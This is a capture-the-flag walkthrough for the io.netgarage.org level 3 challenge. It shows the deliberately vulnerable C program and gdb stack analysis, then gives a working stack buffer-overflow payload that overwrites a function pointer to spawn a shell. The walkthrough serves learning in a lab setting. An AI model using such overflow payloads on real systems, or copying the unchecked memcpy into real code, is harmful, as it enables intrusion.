# Preparation
From **previous level**, we have:
- Username: level3
- Password: ----------------- :)
- Ssh server: io.netgarage.org
# Start
`/levels/level03.c`
```cpp
//bla, based on work by beach

#include <stdio.h>
#include <string.h>

void good()
{
        puts("Win.");
        execl("/bin/sh", "sh", NULL);
}
void bad()
{
        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}

int main(int argc, char **argv, char **envp)
{
        void (*functionpointer)(void) = bad;
        char buffer[50];

        if(argc != 2 || strlen(argv[1]) < 4)
                return 0;
        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4);

        printf("This is exciting we're going to %p\n", functionpointer);
        functionpointer();

        return 0;
}
```
This is a basic buffer overflow exploit. Our mission is to set `functionpointer = good`
## What we have:
- `memcpy` function copies from `argv[1]` to `buffer` of size 50 without checking size
- `functionpointer()` calls directly in source code.
- checksec to ensure `PIE` is disabled
```bash
level3@io:/levels$ checksec level03
[*] '/levels/level03'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
## Exploit:
First, we need to know where's `functionpointer` located. This can be done by finding address of `bad` function and examining stack in gdb.
```
level3@io:/levels$ objdump -d level03 | grep bad
080484a4 <bad>:
level3@io:/levels$ objdump -d level03 | grep good
08048474 <good>:
```
Now we know `bad` function is located at 0x080484a4 and `good` at 0x08048474
Break at printf and start the program with identical string `ABCD`
```bash
0x08048568 <+160>:   call   0x80483ac <printf@plt>
...
(gdb) break * 0x08048568
(gdb) run ABCD
```
Examine the stack:
```cpp
(gdb) x/30x $esp
0xbffffb30:     0x080486c0      0x080484a4      0x00000000      0x08048274
0xbffffb40:     0x00000000      0xbffffbe4      0xb7fc1000      0x00000005
0xbffffb50:     0x44434241 <-   0xb7fc1000      0xb7e19e18      0xb7fd58e8
0xbffffb60:     0xb7fc1000      0x080497c8      0xbffffb78      0x08048338
0xbffffb70:     0xffffffff      0x080497c8      0xbffffba8      0x080485a9
0xbffffb80:     0x00000002      0xb7fc1000      0x00000000      0xb7e3ba2b
0xbffffb90:     0xb7fc13dc      0x080481b4      0x0804859b      0x080484a4 <-
0xbffffba0:     0x00000002      0xb7fc1000
```
Our `buffer` is at address `0xbffffb50`, and `functionpointer` at `0xbffffb9C` so that the offset will be `0x9c - 0x50 = 76`

Our payload: 76 junk characters + address of `good` function in little endian format
```
level3@io:/levels$ ./level03 $(python -c "print('A' * 76 + '\x74\x84\x04\x08')")
This is exciting we're going to 0x8048474
Win.
sh-4.3$
```